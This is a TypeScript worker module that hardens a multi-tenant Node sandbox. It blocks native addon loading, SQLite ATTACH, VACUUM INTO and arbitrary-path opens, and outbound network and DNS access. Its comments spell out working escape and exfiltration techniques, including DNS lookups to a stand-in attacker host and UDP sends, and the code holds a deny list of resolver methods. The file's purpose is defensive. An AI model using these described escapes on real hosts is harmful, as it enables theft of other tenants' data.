import * as fs from "node:fs"
import { createRequire } from "node:module"
import * as path from "node:path"
import { serveBundleServer } from "../start-server.js"

interface BootOptions {
  bundlePath: string
  clientPath?: string
  cwd: string
  port: number
  hostname?: string
  // sha256 hex of the claim token. Worker compares hashes of incoming
  // x-pond-claim-token headers (timing-safe). Plaintext never leaves the
  // host process or sits on disk — the only persisted copy was previously
  // in deploys/<id>.json, which is the leak vector this closes.
  inspectSecretHash?: string
  publicInspect?: boolean
  allowedOrigins?: string[]
  restrictNetwork?: boolean
  maxRestoreBytes?: number
}

type ParentMessage = { type: "boot"; options: BootOptions } | { type: "shutdown" }

let server: { close: (cb?: (err?: Error) => void) => void } | null = null

function send(msg: object) {
  if (process.send) process.send(msg)
}

// Remove every JS-reachable path to running native code inside a capsule
// worker. This is the filesystem analogue of installNetworkRestriction: the
// Node `--permission` model is the only thing isolating one tenant's files
// from another's on the shared-uid host, and `--allow-addons` (which the
// runtime needs because better-sqlite3 is a native addon) "could invalidate
// the permission model" — Node says so itself. A capsule that loads ANY native
// code escapes the fs sandbox entirely (libc open() bypasses --permission), so
// it could read the control DB, sibling deploys' secrets, the host token, etc.
//
// This runs before any capsule code, so the only remaining native-load surfaces are:
//   1. process.dlopen — backs require('*.node') and better-sqlite3's
//      { nativeBinding } option. Sealed non-configurable so capsule code can't
//      restore it.
//   2. better-sqlite3's Database.prototype.loadExtension — a C-level dlopen
//      inside libsqlite that process.dlopen does NOT cover. Sealed separately.
// Realm escapes (worker_threads / child_process, which would start with a fresh
// unsealed process) are already denied: the worker is launched without
// --allow-worker / --allow-child-process, so the permission model blocks them.
//
// Called unconditionally for every capsule (claimed or anonymous): a malicious
// owner is just as able to read another tenant's data as an anonymous one.
export function installSandboxHardening() {
  // Warm + patch better-sqlite3 while process.dlopen still works. The binding
  // loads LAZILY on the first `new Database()`, so we force it now (an in-memory
  // db touches no files) — otherwise the runtime's first real `new Database()`
  // would hit the sealed dlopen below and fail boot.
  try {
    const require = createRequire(import.meta.url)
    const bs = require("better-sqlite3") as (new (path: string) => { close(): void }) & {
      prototype?: Record<string, unknown>
    }
    try {
      new bs(":memory:").close()
    } catch {
      // binding already warm, or :memory: unsupported here — best-effort
    }

    // better-sqlite3's native binding calls libc open() directly, bypassing
    // Node's --permission model, so it is a confused-deputy file primitive for a
    // capsule. Three vectors must be closed (the dlopen/loadExtension seals below
    // cover native-addon loading separately):
    //   1. `new Database('<path>')` — open an arbitrary file as the main db.
    //      --permission already blocks this (better-sqlite3 does a JS-level fs
    //      pre-check on construction, verified), but we validate too so the
    //      boundary survives a future better-sqlite3 that drops that pre-check.
    //   2. `ATTACH DATABASE '<path>'` — opens a SECOND file with NO --permission
    //      check at all (pure native open). This is the real read-exfil: a
    //      capsule can `new Database(':memory:')` then attach /data/control.db or
    //      a sibling deploy's db and read it. Verified empirically.
    //   3. `VACUUM INTO '<path>'` / `db.backup('<path>')` — write the db to an
    //      arbitrary path (a clobber primitive).
    // We block ATTACH outright (capsules don't need cross-db access) rather than
    // parsing its path expression. NOTE: guarding the JS-wrapper SQL text is NOT
    // a complete boundary — the wrappers sit over a native handle whose own
    // exec/prepare and constructor are directly reachable from capsule code. The
    // native-layer block further below re-applies these guards on the native
    // prototype + constructor; both layers are still a JS speed bump, not a
    // kernel boundary (deploy/HARDENING.md §6/§7).
    const allowedRoot = path.resolve(process.cwd())
    const isInsideRoot = (target: string): boolean => {
      let resolved: string
      try {
        if (fs.existsSync(target)) resolved = fs.realpathSync(target)
        else {
          const parent = path.dirname(target)
          if (!fs.existsSync(parent)) return false
          resolved = path.join(fs.realpathSync(parent), path.basename(target))
        }
      } catch {
        return false
      }
      return resolved === allowedRoot || resolved.startsWith(allowedRoot + path.sep)
    }
    const validateSqlitePath = (dbPath: unknown): void => {
      if (typeof dbPath !== "string" || dbPath === ":memory:" || dbPath === "") return
      if (!isInsideRoot(dbPath)) {
        throw new Error(`SQLite database path "${dbPath}" is outside the capsule sandbox`)
      }
    }
    // Strip comments so a `-- ATTACH` / block comment can't mask or smuggle a
    // keyword. String literals are kept so a VACUUM INTO target path stays
    // visible for validation; the leading-keyword checks don't false-match on
    // strings (a statement only "starts with" ATTACH/VACUUM if it really is one).
    const stripSqlComments = (sql: string): string => sql.replace(/--[^\n]*/g, " ").replace(/\/\*[\s\S]*?\*\//g, " ")
    const assertNoSqliteFileEscape = (sql: unknown): void => {
      if (typeof sql !== "string") return
      for (const raw of stripSqlComments(sql).split(";")) {
        const stmt = raw.trim()
        // ATTACH opens a second file with no --permission check — block it
        // outright (capsules have no need to attach other databases).
        if (/^attach\b/i.test(stmt)) {
          throw new Error("ATTACH DATABASE is disabled in the capsule sandbox")
        }
        // VACUUM INTO writes a db copy to a path via native open(). pond's own
        // backup endpoint snapshots into the capsule's deploy dir, so allow an
        // in-root target and reject writing the db anywhere else.
        if (/^vacuum\b/i.test(stmt) && /\binto\b/i.test(stmt)) {
          const m = stmt.match(/\binto\s+'((?:''|[^'])*)'/i)
          const target = m ? m[1].replace(/''/g, "'") : null
          if (target === null || !isInsideRoot(target)) {
            throw new Error("VACUUM INTO outside the capsule sandbox is disabled")
          }
        }
      }
    }
    const bsPath = require.resolve("better-sqlite3")
    const bsModule = require.cache[bsPath]
    if (bsModule) {
      const OriginalDatabase = bsModule.exports
      bsModule.exports = new Proxy(OriginalDatabase, {
        construct(target, args, newTarget) {
          validateSqlitePath(args[0])
          return Reflect.construct(target, args, newTarget)
        },
      })
    }

    const proto = bs?.prototype as Record<string, unknown> | undefined
    if (proto) {
      const sealMethod = (name: string, value: (...a: any[]) => unknown): void => {
        if (typeof proto[name] === "function") {
          Object.defineProperty(proto, name, { value, writable: false, configurable: false })
        }
      }
      // Guard the two SQL entry points: any ATTACH / VACUUM INTO is rejected.
      for (const name of ["exec", "prepare"]) {
        const original = proto[name] as (this: unknown, sql: string) => unknown
        sealMethod(name, function (this: unknown, sql: string) {
          assertNoSqliteFileEscape(sql)
          return original.call(this, sql)
        })
      }
      // backup(dest) opens dest via native code — confine it to the deploy dir.
      const originalBackup = proto.backup as ((this: unknown, dest: unknown, ...rest: any[]) => unknown) | undefined
      if (typeof originalBackup === "function") {
        sealMethod("backup", function (this: unknown, dest: unknown, ...rest: any[]) {
          validateSqlitePath(dest)
          return originalBackup.call(this, dest, ...rest)
        })
      }
      sealMethod("loadExtension", () => {
        throw new Error("SQLite extension loading is disabled in the capsule sandbox")
      })
    }

    // The JS-wrapper seals above are NOT sufficient on their own: proto.exec /
    // prepare / backup are thin wrappers over a NATIVE handle (`this[cppdb]`),
    // and that handle — plus the native Database constructor reachable from it
    // (`handle.constructor`) and from the cached addon — is directly callable by
    // capsule code, skipping the wrappers entirely. Two proven escapes:
    //   a) the handle's own native SQL methods run "ATTACH …" / "VACUUM INTO '…'"
    //      with no wrapper guard at all.
    //   b) `new handle.constructor('/abs/control.db', …)` opens ANY file as the
    //      main db, then a plain SELECT reads it (no ATTACH keyword, so a
    //      SQL-text guard never fires). This bypasses --permission, which does
    //      not mediate sqlite's native open().
    // So we must guard at the native layer too: the native prototype's SQL/file
    // methods and the native constructor's path argument. This is still a JS
    // speed bump, not a kernel boundary (see deploy/HARDENING.md §6/§7) — the
    // real fix is bwrap / an in-process isolate — but it closes the directly
    // reachable native file primitives.
    try {
      const warm = new bs(":memory:") as Record<symbol, unknown> & { close(): void }
      let nativeHandle: Record<string, unknown> | null = null
      for (const sym of Object.getOwnPropertySymbols(warm)) {
        const v = warm[sym]
        if (v && typeof v === "object") {
          const p = Object.getPrototypeOf(v) as Record<string, unknown> | null
          if (p && typeof p.exec === "function" && typeof p.prepare === "function") {
            nativeHandle = v as Record<string, unknown>
            break
          }
        }
      }
      const nativeProto = nativeHandle ? (Object.getPrototypeOf(nativeHandle) as Record<string, unknown>) : null
      try {
        warm.close()
      } catch {
        // best-effort
      }
      if (nativeProto) {
        const sealNative = (name: string, value: (...a: any[]) => unknown): void => {
          if (typeof nativeProto[name] === "function") {
            Object.defineProperty(nativeProto, name, { value, writable: false, configurable: false })
          }
        }
        const RealNative = nativeProto.constructor as (new (...a: any[]) => unknown) | undefined
        if (typeof RealNative === "function") {
          // Validate the file path on EVERY native construction. Legit use opens
          // only `:memory:` or in-root paths; opening control.db / a sibling
          // deploy as the main db is rejected here.
          const GuardedNative = function (this: unknown, filename: unknown, ...rest: any[]) {
            validateSqlitePath(filename)
            return new (RealNative as new (...a: any[]) => unknown)(filename, ...rest)
          } as unknown as new (...a: any[]) => unknown
          ;(GuardedNative as { prototype: unknown }).prototype = nativeProto
          // Both references a capsule can reach to the native ctor: the cached
          // addon object (require('…better_sqlite3.node').Database) and the
          // handle's own `.constructor`. Point both at the guarded ctor.
          const nodeKey = Object.keys(require.cache).find((k) => k.endsWith(".node") && k.includes("better_sqlite3"))
          const addon = nodeKey ? (require.cache[nodeKey]?.exports as Record<string, unknown> | undefined) : undefined
          if (addon && addon.Database === RealNative) {
            try {
              Object.defineProperty(addon, "Database", { value: GuardedNative, writable: false, configurable: false })
            } catch {
              // best-effort
            }
          }
          try {
            Object.defineProperty(nativeProto, "constructor", {
              value: GuardedNative,
              writable: false,
              configurable: false,
            })
          } catch {
            // best-effort
          }
        }
        const nativeExec = nativeProto.exec as ((this: unknown, sql: string) => unknown) | undefined
        const nativePrepare = nativeProto.prepare as ((this: unknown, sql: string, ...r: any[]) => unknown) | undefined
        if (typeof nativeExec === "function") {
          sealNative("exec", function (this: unknown, sql: string) {
            assertNoSqliteFileEscape(sql)
            return nativeExec.call(this, sql)
          })
        }
        if (typeof nativePrepare === "function") {
          sealNative("prepare", function (this: unknown, sql: string, ...rest: any[]) {
            assertNoSqliteFileEscape(sql)
            return nativePrepare.call(this, sql, ...rest)
          })
        }
        const nativeBackup = nativeProto.backup as ((this: unknown, dest: unknown, ...r: any[]) => unknown) | undefined
        if (typeof nativeBackup === "function") {
          sealNative("backup", function (this: unknown, dest: unknown, ...rest: any[]) {
            validateSqlitePath(dest)
            return nativeBackup.call(this, dest, ...rest)
          })
        }
        sealNative("loadExtension", () => {
          throw new Error("SQLite extension loading is disabled in the capsule sandbox")
        })
      }
    } catch {
      // native-handle shape changed or unavailable — best-effort
    }
  } catch {
    // better-sqlite3 not resolvable here — nothing to seal, best-effort
  }
  // Seal process.dlopen last so the require above could still load the addon.
  try {
    Object.defineProperty(process, "dlopen", {
      value: () => {
        throw new Error("Loading native addons is disabled in the capsule sandbox")
      },
      writable: false,
      configurable: false,
      enumerable: false,
    })
  } catch {
    // already sealed / non-configurable — best-effort
  }
}

// Exported only so the regression test can exercise the shim in an isolated
// child process. The worker itself calls it via the boot message path below.
export async function installNetworkRestriction() {
  const denyMsg = "Outbound network access disabled for anonymous deploys"
  const denyFetch = () => {
    throw new Error(denyMsg)
  }
  ;(globalThis as any).fetch = denyFetch
  try {
    // undici may not be installed and has no bundled types here; use a
    // string-built specifier so tsc doesn't try to resolve it.
    const specifier = "undici"
    const undici = (await import(specifier)) as { fetch?: unknown }
    if (undici && typeof undici === "object") (undici as { fetch?: unknown }).fetch = denyFetch
  } catch {
    // undici may not be installed; best-effort
  }
  // Patch net.Socket.prototype.connect — blocks node:http, node:https, tls.connect,
  // and any direct net.Socket usage. This isn't airtight (a determined capsule could
  // load a native module that bypasses the JS layer), but it raises the bar from
  // "one line of node:https" to "you have to ship native code."
  try {
    const net = await import("node:net")
    net.Socket.prototype.connect = function (...args: unknown[]) {
      const a0 = args[0]
      let host = ""
      let port: number | string = ""
      if (typeof a0 === "object" && a0 !== null) {
        const obj = a0 as { path?: unknown; host?: unknown; address?: unknown; port?: unknown }
        if (typeof obj.path === "string") {
          throw new Error(`${denyMsg} (unix socket: ${obj.path})`)
        }
        host = String(obj.host ?? obj.address ?? "")
        port = typeof obj.port === "number" || typeof obj.port === "string" ? obj.port : ""
      } else if (typeof a0 === "number" || typeof a0 === "string") {
        port = a0
        if (typeof args[1] === "string") host = args[1]
      }
      throw new Error(`${denyMsg} (attempted connect to ${host || "<unspecified>"}:${port})`)
    }
  } catch {
    // node:net should always be available; best-effort
  }
  // UDP: node:dgram does NOT go through net.Socket, and Node's --permission model
  // does not gate the network at all, so without this a capsule can exfiltrate to
  // any host:port with `dgram.createSocket('udp4').send(secret, port, ip)` — no
  // DNS and no native code required. Seal the outbound entry points on the
  // Socket prototype (send + connected-mode connect); bind/receive is harmless.
  try {
    const dgram = await import("node:dgram")
    const proto = (dgram as unknown as { Socket?: { prototype?: Record<string, unknown> } }).Socket?.prototype
    if (proto) {
      const denyDgram = () => {
        throw new Error(`${denyMsg} (udp datagram)`)
      }
      for (const name of ["send", "connect"]) {
        if (typeof proto[name] === "function") {
          try {
            Object.defineProperty(proto, name, { value: denyDgram, writable: false, configurable: false })
          } catch {
            proto[name] = denyDgram
          }
        }
      }
    }
  } catch {
    // node:dgram should always be available; best-effort
  }
  // DNS: a capsule can leak data via dns.lookup("<secret>.attacker.example.com")
  // even with net.Socket.connect blocked, because the resolver query leaves the
  // host before any TCP connect. We patch node:dns here as defense-in-depth — it
  // closes the obvious dns.lookup/dns.resolve exfil at the JS layer. It is NOT
  // the boundary: a native addon (or a Node internal that bypasses these JS
  // entry points) can still resolve names, so DNS exfil is closed for real only
  // at the OS layer (the nft egress firewall drops 53/udp+tcp). Both layers run.
  try {
    // Patch the CommonJS module object (via createRequire), not the ESM
    // namespace from `import()` — builtin ESM namespaces are frozen, so
    // assigning to their properties silently no-ops. The CJS object is the
    // mutable surface every consumer (incl. ESM `import dns from "node:dns"`,
    // whose default export IS this object) reads its methods off of.
    const { createRequire } = await import("node:module")
    const require = createRequire(import.meta.url)
    const dns = require("node:dns") as Record<string, unknown> & { promises?: Record<string, unknown> }
    const { isIP } = await import("node:net")
    // A name we let through to the real resolver: a literal IP address (no DNS
    // query actually leaves the box) or loopback. These can't be used to
    // exfiltrate via the resolver, and the worker itself must resolve 127.0.0.1
    // / localhost to bind its own HTTP server. Everything else (a real hostname)
    // is blocked — that's the exfil channel.
    const isSafeName = (name: unknown): boolean => {
      if (typeof name !== "string") return false
      const n = name.trim().toLowerCase().replace(/\.$/, "")
      return isIP(n) !== 0 || n === "localhost"
    }
    const wrap = (orig: unknown) =>
      function (this: unknown, ...args: unknown[]) {
        if (isSafeName(args[0]) && typeof orig === "function") {
          return (orig as (...a: unknown[]) => unknown).apply(this, args)
        }
        const name = typeof args[0] === "string" ? args[0] : "<name>"
        const cb = args.find((a) => typeof a === "function") as ((err: Error) => void) | undefined
        const err = new Error(`${denyMsg} (dns resolve of ${name})`)
        // Callback-style (dns.lookup, dns.resolve): fail via callback, matching
        // the patched net.Socket's "fail loud" posture without crashing the loop.
        if (cb) {
          cb(err)
          return
        }
        throw err
      }
    const wrapPromise = (orig: unknown) =>
      async function (this: unknown, ...args: unknown[]) {
        if (isSafeName(args[0]) && typeof orig === "function") {
          return (orig as (...a: unknown[]) => unknown).apply(this, args)
        }
        const name = typeof args[0] === "string" ? args[0] : "<name>"
        throw new Error(`${denyMsg} (dns resolve of ${name})`)
      }
    // Every resolver method that emits a DNS query off-box. resolveTxt/resolveMx
    // etc. are exfil channels just like lookup — a partial list (lookup/resolve
    // only) leaves dns.resolveTxt("<secret>.attacker.com") wide open.
    const CALLBACK_METHODS = [
      "lookup",
      "lookupService",
      "resolve",
      "resolve4",
      "resolve6",
      "resolveAny",
      "resolveCname",
      "resolveCaa",
      "resolveMx",
      "resolveNaptr",
      "resolveNs",
      "resolvePtr",
      "resolveSoa",
      "resolveSrv",
      "resolveTxt",
      "reverse",
    ] as const
    // The promise API has the same resolver surface minus lookupService.
    const PROMISE_METHODS = CALLBACK_METHODS.filter((k) => k !== "lookupService")
    for (const key of CALLBACK_METHODS) {
      if (typeof dns[key] === "function") dns[key] = wrap(dns[key])
    }
    if (dns.promises && typeof dns.promises === "object") {
      for (const key of PROMISE_METHODS) {
        if (typeof dns.promises[key] === "function") dns.promises[key] = wrapPromise(dns.promises[key])
      }
    }
    // A `new dns.Resolver()` (or promises.Resolver) instance holds its own copies
    // of these methods, bypassing the module-level patches above. Patch the
    // prototypes so instances are covered too.
    const callbackResolver = (dns as { Resolver?: { prototype?: Record<string, unknown> } }).Resolver
    if (callbackResolver?.prototype) {
      for (const key of PROMISE_METHODS) {
        if (typeof callbackResolver.prototype[key] === "function")
          callbackResolver.prototype[key] = wrap(callbackResolver.prototype[key])
      }
    }
    const promiseResolver = (dns.promises as { Resolver?: { prototype?: Record<string, unknown> } } | undefined)
      ?.Resolver
    if (promiseResolver?.prototype) {
      for (const key of PROMISE_METHODS) {
        if (typeof promiseResolver.prototype[key] === "function")
          promiseResolver.prototype[key] = wrapPromise(promiseResolver.prototype[key])
      }
    }
  } catch {
    // node:dns should always be available; best-effort
  }
}

process.on("message", async (msg: ParentMessage) => {
  if (msg.type === "boot") {
    try {
      // Always run, before the capsule bundle is imported by serveBundleServer:
      // the fs/native-code escape applies to every capsule regardless of network
      // policy or claim status.
      installSandboxHardening()
      if (msg.options.restrictNetwork) {
        await installNetworkRestriction()
      }
      const result = await serveBundleServer(msg.options)
      server = result.server
      send({ type: "booted", port: result.port })
    } catch (err: any) {
      send({ type: "error", message: err?.message ?? String(err) })
      process.exit(1)
    }
  } else if (msg.type === "shutdown") {
    if (!server) {
      send({ type: "closed" })
      process.exit(0)
    }
    await new Promise<void>((resolve) => server!.close(() => resolve()))
    send({ type: "closed" })
    process.exit(0)
  }
})

process.on("disconnect", () => {
  process.exit(0)
})
